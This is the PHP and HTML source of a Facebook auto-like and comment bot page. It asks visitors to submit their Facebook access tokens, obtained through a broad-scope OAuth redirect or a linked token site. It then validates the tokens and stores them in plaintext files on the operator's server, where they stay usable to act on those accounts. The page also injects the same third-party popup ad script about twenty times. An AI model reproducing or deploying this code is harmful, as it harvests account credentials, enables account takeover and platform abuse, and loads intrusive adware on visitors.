<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>CH BOTTERX</title> <script type='text/javascript'>
//<![CDATA[
msg = " ♥ MRDJ AYESH ♥ ";
msg = "" + msg;pos = 0;
function scrollMSG()
{document.title = msg.substring(pos, msg.length) + msg.substring(0, pos); pos++;
if (pos > msg.length) pos = 0
window.setTimeout("scrollMSG()",150);}
scrollMSG();
//]]>
</script> 
<link <link href="B.css" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=Audiowide" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/cssf8d0.css?family=Audiowide" rel="stylesheet" type="text/css">
<link rel="shortcut icon" type="image/png" href="https://cdn3.iconfinder.com/data/icons/inside/PNG/256x256/icontexto-inside-facebook.png"/>
</div>
<center><div style="font-family: Audiowide;
font-size: 50pt">
<center><script language="JavaScript" src="B.js"></script></font></center>
<div style="font-family: Audiowide;
font-size: 23pt;
text-shadow: 0 0 11px #CC0000, 0 0 11px #CC0000, 0 0 11px #CC0000;
color: #FFF">
<center/>


<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script>
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script>
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script>

<?php
 error_reporting(0);
$bot=new bot();
class bot{

public function getGr($as,$bs){
$ar=array(
        'graph',
        'fb',
        'me'
);
$im='https://'.implode('.',$ar);

return $im.$as.$bs;
}

public function getUrl($mb,$tk,$uh=null){
$ar=array(
        'access_token' => $tk,
);
if($uh){
$else=array_merge($ar,$uh);
        }else{
        $else=$ar;
}
foreach($else as $b => $c){
        $XD[]=$b.'='.$c;
}
$true='?'.implode('&',$XD);
$true=$this->getGr($mb,$true);
$true=json_decode($this->
one($true),true);
if($true[data]){
        return $true[data];
}else{
        return $true;}
}

private function one($url){
$cx=curl_init();
curl_setopt_array($cx,array(
CURLOPT_URL => $url,
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => 1,
CURLOPT_USERAGENT => 'DESCRIPTION by Ali',
));
$ch=curl_exec($cx);
        curl_close($cx);
        return ($ch);
}

public function savEd($tk,$id,$a,$b,$o,$c,$z=null,$bb=null){
if(!is_dir('XD')){
        mkdir('XD');
}
if($bb){
$blue=fopen('XD/'.$id,'w');
fwrite($blue,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$bb);
        fclose($blue);

echo'<script type="text/javascript">alert("INFO : Your Written Comment Has Been Saved !! Good Luck !! ")</script>';
}else{
        if($z){
if(file_exists('XD/'.$id)){
$file=file_get_contents('XD/'.$id);
$ex=explode('*',$file);
$str=str_replace($ex[0],$tk,$file);
$xs=fopen('XD/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}else{
$str=$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c;
$xs=fopen('XD/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}
$_SESSION[key]=$tk.'_'.$id;
}else{
$file=file_get_contents('XD/'.$id);
$file=explode('*',$file);
        if($file[5]){
$up=fopen('XD/'.$id,'w');
fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c.'*'.$file[5]);
        fclose($up);
        }else{
$up=fopen('XD/'.$id,'w');
fwrite($up,$tk.'*'.$a.'*'.$b.'*'.$o.'*'.$c);
        fclose($up);
        }
echo'<script type="text/javascript">alert("INFO : Script Comment Has Been Saved !!")</script>';}}
}

public function lOgbot($d){
        unlink('XD/'.$d);
        unset($_SESSION[key]);

echo'
<script type="text/javascript">alert("INFO : Logout success")
</script>';

        $this->atas();
        $this->home();
        $this->bwh();
}

public function cek($tok,$id,$nm){
$if=file_get_contents('XD/'.$id);
$if=explode('*',$if);
if(preg_match('/on/',$if[1])){
        $satu='on';
        $ak='Like tambah komen';
}else{
        $satu='off';
        $ak='Like saja';
}
if(preg_match('/on/',$if[2])){
        $dua='on';
        $ik='Bot emo';
}else{
        $dua='off';
        $ik='Bot manual';
}
if(preg_match('/on/',$if[3])){
        $tiga='on';
        $ek='Powered on';
}else{
        $tiga='off';
        $ek='Powered off';
}
if(preg_match('/on/',$if[4])){
        $empat='on';
        $uk='Text via script';
}else{
        $empat='off';
        $uk='Via text sendiri';
}
echo'
<center><div id="bottom-content">
<div id="navigation-menu">
<br>
<ul>
<font color="white"><script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script>Welcome :  '.$nm.'</font>
<br>
<br>
<a href="http://m.facebook.com/'.$id.'"><script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><img src="https://graph.facebook.com/'.$id.'/picture" style="width:50px; height:50px;border: 1px solid white;border-radius: 100px;background-color: white;" alt="'.$nm.'"/></a>
<br>
 <font color="white"><script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script>Your Bot has been Activated '.$nm.'</font>
<br>
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><form action="index.php" method="post"><input type="hidden" name="logout" value="'.$id.'">
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><input class="button button5" type="submit" value="Logout Bot"></form>
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><center><div class="hr"><hr /></div></center>
<br>
<br>
<br>
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><form action="index.php" method="post">
<center>
<font color="black" size="3">Select Menu Robot</font></center>
<select class="button button5">';
        if($satu=='on'){
        echo'
<option value="'.$satu.'">
'.$ak.'
</option>
<option value="off">
Like saja</option>
</select>';
        }else{
        echo'
<option value="'.$satu.'">
'.$ak.'
</option>
<option value="on">
Like tambah komen</option>
</select>';
}
echo'

<select  class="button button5" name="emot">';
        if($dua=='on'){
        echo'
<option value="'.$dua.'">
'.$ik.'
</option>
<option value="off">
Bot manual</option>
</select>';
        }else{
        echo'
<option value="'.$dua.'">
'.$ik.'
</option>
<option value="on">
Bot emo</option>
</select>';
}
echo'

<select  class="button button5" name="target">';
        if($tiga=='on'){
        echo'
<option value="'.$tiga.'">
'.$ek.'
</option>
<option value="off">
Powered off</option>
</select>';
        }else{
        echo'
<option value="'.$tiga.'">
'.$ek.'
</option>
<option value="on">
Powered on</option>
</select>';
}
echo'
';
        if($empat=='on'){
        echo'
<select class="button button5" name="opsi">
<option value="'.$empat.'">
'.$uk.'
</option>
<option value="off">
Via text sendiri</option>
</select>';
}else{
        if($if[5]){
        echo'
<select  class="button button5" name="opsi">
<option value="'.$empat.'">
'.$uk.'
</option>
<option value="text">
Ganti Text Anda
</option>
<option value="on">
Text via script</option>
</select>';
        }else{
        echo'
Buat text Anda

<input type="text" name="text" style="height:30px;">
<input type="hidden" name="opsi" value="'.$empat.'">';}
}
echo'

</ul></div>

<ul><div id="top-content">
<div id="search-form">
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><input class="button button5" type="submit" value="SAVE"></form>
</div></div></div></ul></center>';

$this->membEr();
}

public function atas(){
$hari=array(1=>
        "Monday",
        "Tuesday",
        "Wednesday",
        "Thursday",
        "Friday",
        "Saturday",
        "Sunday"
);

$bulan=array(1=>
"January",
  "February",
    "March",
     "April",
       "May",
         "June",
           "July",
             "August",
               "September",
          "October",
     "November",
"Desember"
);

$hr=$hari[gmdate('N',time()+60*60*7)];
$tgl=gmdate('j',time()+60*60*7);
$bln=
$bulan[gmdate('n',time()+60*60
*7)];
$thn=gmdate('Y',time()+60*60*7);
$jam=gmdate('H',time()+60*60*7);


echo'
<div id="header">

<marquee behavior="alternate">

<script src="ayesh.js"></script></marquee>

<br>
<br></div>


';
}
public function home(){
echo'
<div id="profile">

<div class="css">

<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><a href="https://www.facebook.com/100023135624220" alt="Owner" target="_blank"> <img src="https://graph.facebook.com/100023135624220/picture?type=large" alt="Profile" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(65, 227, 181); padding: 8px;" width="250" height="250"></a> </br>

<div id="center">';
}

public function bwh(){
echo'
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><iframe src="https://www.facebook.com/plugins/follow?href=https%3A%2F%2Fwww.facebook.com%2Fx3Ayesh&amp;layout=standard&amp;show_faces=true&amp;colorscheme=light&amp;width=450&amp;height=80" scrolling="no" frameborder="0" style="border:none; overflow:hidden; width:450px; height:80px;" allowTransparency="true"></iframe>

<center><script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><a href="http://www.facebook.com/100002383109158" target="_blank"></a><a href="http://new-token.ml/" target="_blank"><input class="button button5" type="button" value="♥ GET TOKEN ♥"> </a><a href="http://www.facebook.com/x3ayesh" target="_blank"><input class="button button5" type="button" value="♥ ADMIN ♥"> </a></center>

<center><script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><font size="20" color="red">⚔</font><b><font style="background: url(&quot;http://img1.liveinternet.ru/images/attach/c/3/77/307/77307665_MontiBlingStar77.gif&quot;) repeat scroll 0% 0% transparent;color:#fff; text-shadow: 0pt 0pt 0.20em red, 0pt 5pt 0.9em white;color: white ;font-size:30;">SUBMIT YOUR TOKEN HERE !!</font></b></font><font size="20" color="Red">⚔</font></center>
<center><script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><form action="index.php" method="post"><input class="inptext inptext1" type="text" placeholder="EAAAACZAVC6ygBAOXNxONaZAc9GnN9kcLxZCsba3ED4hjLZBX2BJDPwDUBZBpvyZAb538ABEh3k3zmMgObJbOA32VsZAzndFmBahJVz6C4y0ZBEG0nzJQ7ZCbsdUvlEjEsZB9ciEXqoMILLlKCES6n3jqscohpvPbMXSj8ZD" st="" name="token"> <br><input class="button button5" id="sbmt" type="submit" value="SUBMIT"></form></center>';
$this->membEr();
}
public function membEr(){
if(!is_dir('XD')){
mkdir('XD');
}
$up=opendir('XD');
while($use=readdir($up)){
if($use != '.' && $use != '..'){
$user[]=$use;}
}

echo'
<font>
<div style="font-family: Audiowide;
font-size: 25pt;
text-shadow: 0 0 11px #CC0000, 0 0 11px #CC0000, 0 0 11px #CC0000;
color: #FFF">
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><center><font style="text-shadow: 2px 1px orange; color:yellow;" size="6">• BOT LOVERS : <font color="red">'.count($user).'</font> <font style="text-shadow: 2px 1px red; color:white;" size="4"></font>
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><center><strong><font style="text-shadow: 2px 1px black; color:red;" size="5">• OWNER: MRDJ AYESH </font></strong></center><font style="text-shadow: 2px 1px blue; color:white;" size="5">
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><br></font></font></center></div><font style="text-shadow: 2px 1px black; color:white;" size="6"><font style="text-shadow: 2px 1px blue; color:white;" size="5"><audio autoiceland="" loop="">
<font color="red">

</font></audio></font></font></font>';
}

public function toXen($h){
header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
}


}
if(isset($_SESSION[key])){
$a=$_SESSION[key];
$ai=explode('_',$a);
$a=$ai[0];
if($_POST[logout]){
$ax=$_POST[logout];
$bot->lOgbot($ax);
}else{
$b=$bot->getUrl('/me',$a,array(
'fields' => 'id,name',
));
if($b[id]){
if($_POST[likes]){
$as=$_POST[likes];
$bs=$_POST[emot];
$bx=$_POST[target];
$cs=$_POST[opsi];
$tx=$_POST[text];
if($cs=='text'){
unlink('XD/'.$b[id]);
$bot->savEd($a,$b[id],$as,$bs,$bx,'off');
}else{
if($tx){
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);
}else{
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}
}
$bot->atas();
$bot->home();
$bot->cek($a,$b[id],$b[name]);
}else{
echo '<script type="text/javascript">alert("INFO: Session Token Expired")</script>';
unset($_SESSION[key]);
unlink('XD/'.$ai[1]);
$bot->atas();
$bot->home();
$bot->bwh();}}
}else{
if($_POST[token]){
$a=$_POST[token];
if(preg_match('/token/',$a)){
$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));
}else{
$cut=explode('&',$a);
$tok=$cut[0];
}
$b=$bot->getUrl('/me',$tok,array(
'fields' => 'id,name',
));
if($b[id]){
$bot->savEd($tok,$b[id],'on','on','on','on','null');
$bot->atas();
$bot->home();
$bot->cek($tok,$b[id],$b[name]);
}else{
echo '<script type="text/javascript">alert("INFO: Token invalid")</script>';
$bot->atas();
$bot->home();
$bot->bwh();}
}else{
if($_GET[token]){
$a=$_GET[token];
$bot->toXen($a);
}else{
$bot->atas();
$bot->home();
$bot->bwh();}}
}
?>
<audio autoplay loop>
      <source src="http://songolum.com/files/4QiWVeaoH.mp3">
</audio>